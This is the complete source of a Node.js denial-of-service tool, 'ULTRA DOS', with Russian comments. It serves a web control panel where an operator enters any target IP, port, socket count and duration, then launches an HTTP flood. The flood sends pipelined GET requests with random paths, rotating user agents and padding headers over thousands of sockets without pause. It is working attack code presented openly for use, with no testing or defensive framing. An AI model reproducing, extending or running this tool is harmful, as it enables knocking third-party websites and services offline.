// server.js - высокоинтенсивный DoS с реальной статистикой
// Запуск: node server.js (порт 3000 для веб-панели)
// Атака: POST /start с параметрами

const http = require('http');
const net = require('net');
const url = require('url');
const fs = require('fs');

// ---------- ГЛОБАЛЬНАЯ СТАТИСТИКА ----------
const stats = {
  running: false,
  totalRequests: 0,
  totalBytesSent: 0,
  activeSockets: 0,
  failedConnections: 0,
  startTime: 0,
  target: ''
};

let stopAttack = false;
let attackSockets = [];

// ---------- ВСТРОЕННЫЙ HTML С СТАТИСТИКОЙ ----------
const htmlPage = `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>ULTRA DOS PANEL</title>
  <style>
    body { background: #0a0a0a; color: #00ffcc; font-family: 'Courier New', monospace; padding: 20px; }
    .container { max-width: 700px; margin: auto; background: #111; padding: 25px; border: 1px solid #00ff88; border-radius: 10px; }
    h2 { color: #ff3366; text-shadow: 0 0 10px #ff3366; }
    label { display: inline-block; width: 140px; color: #aaa; }
    input { width: 200px; padding: 8px; margin: 6px 0; background: #222; border: 1px solid #00ff88; color: #fff; border-radius: 4px; }
    button { background: #ff0033; color: #fff; padding: 14px 40px; border: none; border-radius: 6px; font-size: 18px; cursor: pointer; font-weight: bold; }
    button:disabled { background: #444; cursor: not-allowed; }
    #stats { margin-top: 20px; background: #1a1a1a; padding: 15px; border-radius: 6px; font-size: 14px; line-height: 1.8; }
    .stat-line { display: flex; justify-content: space-between; border-bottom: 1px solid #222; padding: 4px 0; }
    .stat-value { color: #00ffaa; font-weight: bold; }
    .running { color: #ff4444; animation: blink 0.5s infinite; }
    @keyframes blink { 50% { opacity: 0; } }
  </style>
</head>
<body>
<div class="container">
  <h2>⚡ ULTRA DOS ATTACK</h2>
  <div><label>Target IP:</label><input type="text" id="ip" value="127.0.0.1"></div>
  <div><label>Port:</label><input type="number" id="port" value="3001"></div>
  <div><label>Sockets:</label><input type="number" id="sockets" value="2000"></div>
  <div><label>Duration (sec):</label><input type="number" id="duration" value="60"></div>
  <div><label>Requests per socket:</label><input type="number" id="perSocket" value="999999"></div>
  <button id="startBtn">🔥 LAUNCH ATTACK</button>
  <div id="stats">
    <div class="stat-line"><span>Status:</span><span id="statusText" class="stat-value">IDLE</span></div>
    <div class="stat-line"><span>Target:</span><span id="targetStat" class="stat-value">-</span></div>
    <div class="stat-line"><span>Total Requests:</span><span id="reqStat" class="stat-value">0</span></div>
    <div class="stat-line"><span>Total Bytes:</span><span id="bytesStat" class="stat-value">0 MB</span></div>
    <div class="stat-line"><span>Active Sockets:</span><span id="socketStat" class="stat-value">0</span></div>
    <div class="stat-line"><span>Failed Conns:</span><span id="failStat" class="stat-value">0</span></div>
    <div class="stat-line"><span>Uptime:</span><span id="timeStat" class="stat-value">0s</span></div>
  </div>
</div>
<script>
  const startBtn = document.getElementById('startBtn');
  function updateStats() {
    fetch('/stats')
      .then(res => res.json())
      .then(data => {
        document.getElementById('statusText').textContent = data.running ? 'ATTACKING' : 'IDLE';
        document.getElementById('statusText').style.color = data.running ? '#ff4444' : '#00ffaa';
        document.getElementById('targetStat').textContent = data.target || '-';
        document.getElementById('reqStat').textContent = data.totalRequests || 0;
        let mb = (data.totalBytes / 1024 / 1024).toFixed(2);
        document.getElementById('bytesStat').textContent = mb + ' MB';
        document.getElementById('socketStat').textContent = data.activeSockets || 0;
        document.getElementById('failStat').textContent = data.failedConnections || 0;
        let up = data.running ? Math.floor((Date.now() - data.startTime)/1000) : 0;
        document.getElementById('timeStat').textContent = up + 's';
      });
  }
  setInterval(updateStats, 500);

  startBtn.addEventListener('click', function() {
    const ip = document.getElementById('ip').value.trim();
    const port = parseInt(document.getElementById('port').value);
    const sockets = parseInt(document.getElementById('sockets').value);
    const duration = parseInt(document.getElementById('duration').value);
    const perSocket = parseInt(document.getElementById('perSocket').value);
    if (!ip || isNaN(port) || isNaN(sockets) || isNaN(duration) || sockets <= 0 || duration <= 0) {
      alert('Invalid params');
      return;
    }
    startBtn.disabled = true;
    fetch('/start', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ ip, port, sockets, duration, perSocket })
    })
    .then(res => res.json())
    .then(data => {
      if (data.status === 'ok') {
        startBtn.textContent = 'RUNNING...';
        setTimeout(() => { startBtn.disabled = false; startBtn.textContent = '🔥 LAUNCH ATTACK'; }, duration*1000 + 2000);
      } else {
        alert('Error: ' + data.message);
        startBtn.disabled = false;
      }
    });
  });
</script>
</body>
</html>`;

// ---------- ЯДРО АТАКИ (МАКСИМАЛЬНО АГРЕССИВНОЕ) ----------
function startUltraAttack(targetIp, targetPort, socketCount, durationSec, reqPerSocket) {
  if (stats.running) return;
  stats.running = true;
  stats.totalRequests = 0;
  stats.totalBytesSent = 0;
  stats.activeSockets = 0;
  stats.failedConnections = 0;
  stats.startTime = Date.now();
  stats.target = targetIp + ':' + targetPort;
  stopAttack = false;
  attackSockets = [];

  console.log(`[ATTACK] ${targetIp}:${targetPort} | sockets=${socketCount} | req/sock=${reqPerSocket} | time=${durationSec}s`);

  // Генераторы мусора
  const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0'
  ];

  function randomPath() {
    const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let p = '/';
    for (let i=0; i<Math.floor(Math.random()*20)+10; i++) p += chars[Math.floor(Math.random()*chars.length)];
    return p;
  }

  function buildFloodRequest() {
    const path = randomPath();
    const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
    // Добавляем случайные заголовки для увеличения размера
    const extra = `X-Random-${Math.floor(Math.random()*9999)}: ${Math.random().toString(36).substring(2, 15)}\r\n`;
    // HTTP/1.1 с Keep-Alive и конвейером
    return `GET ${path} HTTP/1.1\r\nHost: ${targetIp}\r\nUser-Agent: ${ua}\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nConnection: keep-alive\r\n${extra}\r\n`;
  }

  // Функция для одного сокета: конвейерная отправка без пауз
  function createSocketWorker() {
    const sock = new net.Socket();
    let connected = false;
    let requestsSent = 0;
    let closeReason = '';

    sock.setTimeout(5000);
    sock.on('connect', () => {
      connected = true;
      stats.activeSockets++;
      // Отправляем пачку запросов максимально быстро
      function sendBatch() {
        if (stopAttack || requestsSent >= reqPerSocket) {
          sock.destroy();
          return;
        }
        // Конвейер: от 5 до 15 запросов за один write
        const batchSize = Math.floor(Math.random() * 10) + 5;
        let batch = '';
        for (let i = 0; i < batchSize; i++) {
          if (requestsSent >= reqPerSocket) break;
          batch += buildFloodRequest();
          requestsSent++;
          stats.totalRequests++;
        }
        if (batch.length > 0) {
          try {
            sock.write(batch);
            stats.totalBytesSent += Buffer.byteLength(batch);
          } catch (e) {
            // ошибка записи - закрываем
            sock.destroy();
            return;
          }
        }
        // НЕМЕДЛЕННО отправляем следующую партию (без setTimeout)
        // Используем setImmediate для избежания стека
        if (!stopAttack && requestsSent < reqPerSocket) {
          setImmediate(sendBatch);
        } else {
          sock.destroy();
        }
      }
      sendBatch();
    });

    sock.on('error', (err) => {
      if (!connected) stats.failedConnections++;
      sock.destroy();
    });

    sock.on('close', () => {
      if (connected) stats.activeSockets--;
      // удаляем из глобального списка
      const idx = attackSockets.indexOf(sock);
      if (idx > -1) attackSockets.splice(idx, 1);
    });

    sock.connect(targetPort, targetIp);
    return sock;
  }

  // Запускаем все сокеты
  for (let i = 0; i < socketCount; i++) {
    if (stopAttack) break;
    const sock = createSocketWorker();
    attackSockets.push(sock);
    // небольшая задержка при старте, чтобы не перегрузить локальный стек
    if (i % 100 === 0) {
      // микро-пауза для планировщика
      const pause = new Promise(resolve => setImmediate(resolve));
      // но синхронно не блокируем - используем setImmediate
    }
  }

  // Таймер останова
  setTimeout(() => {
    stopAttack = true;
    stats.running = false;
    console.log('[ATTACK] Stop signal - destroying sockets');
    // Принудительно закрываем все сокеты
    for (const s of attackSockets) {
      try { s.destroy(); } catch(e) {}
    }
    attackSockets = [];
    stats.activeSockets = 0;
    console.log(`[ATTACK] Finished. Total req: ${stats.totalRequests}, Bytes: ${(stats.totalBytesSent/1024/1024).toFixed(2)} MB`);
  }, durationSec * 1000);
}

// ---------- HTTP СЕРВЕР ДЛЯ УПРАВЛЕНИЯ ----------
const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  const path = parsed.pathname;

  // Главная страница
  if (path === '/' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end(htmlPage);
    return;
  }

  // Статистика (JSON)
  if (path === '/stats' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({
      running: stats.running,
      totalRequests: stats.totalRequests,
      totalBytes: stats.totalBytesSent,
      activeSockets: stats.activeSockets,
      failedConnections: stats.failedConnections,
      startTime: stats.startTime,
      target: stats.target
    }));
    return;
  }

  // Запуск атаки
  if (path === '/start' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        const ip = data.ip;
        const port = parseInt(data.port);
        const sockets = parseInt(data.sockets);
        const duration = parseInt(data.duration);
        const perSocket = parseInt(data.perSocket) || 999999;

        if (!ip || isNaN(port) || isNaN(sockets) || isNaN(duration) || sockets <= 0 || duration <= 0) {
          res.writeHead(400);
          res.end(JSON.stringify({ status: 'error', message: 'Invalid params' }));
          return;
        }
        if (stats.running) {
          res.writeHead(400);
          res.end(JSON.stringify({ status: 'error', message: 'Attack already running' }));
          return;
        }
        // Запуск в фоне (не ждём)
        setImmediate(() => startUltraAttack(ip, port, sockets, duration, perSocket));
        res.writeHead(200);
        res.end(JSON.stringify({ status: 'ok' }));
      } catch (e) {
        res.writeHead(400);
        res.end(JSON.stringify({ status: 'error', message: 'Invalid JSON' }));
      }
    });
    return;
  }

  res.writeHead(404);
  res.end('Not found');
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`[PANEL] http://localhost:${PORT}`);
  console.log('[READY] Configure and launch attack.');
});
